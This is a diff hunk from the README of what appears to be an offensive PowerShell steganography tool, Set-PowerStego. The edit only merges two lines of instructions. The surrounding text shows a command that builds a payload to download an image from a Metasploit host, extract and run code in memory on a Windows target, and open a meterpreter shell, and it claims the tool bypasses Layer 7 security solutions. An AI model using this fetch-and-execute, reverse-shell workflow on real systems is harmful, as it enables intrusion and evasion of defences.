@@ -86,5 +86,4 @@ With Set-PowerStego you can bypass Layer 7 security solutions.
     9 - Generate a command line to execute the payload on the target.
     Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath http://<IPFROMMETASPLOITHOST:8080>/myimage.png -PayloadSource Text -PayloadPath myscript.txt
 
-    Execute the content from the file myscript.txt on any Windows workstion with powershell and access to the metasploit host.
-    After the execution, it will be download the image to the memory from the target, the payload extration and execution on the memory, and you will receive a meterpreter shell on the Metasploit host.
+    Execute the content from the file myscript.txt on any Windows workstion with powershell and access to the metasploit host. After the execution, it will be download the image to the memory from the target, the payload extration and execution on the memory, and you will receive a meterpreter shell on the Metasploit host.
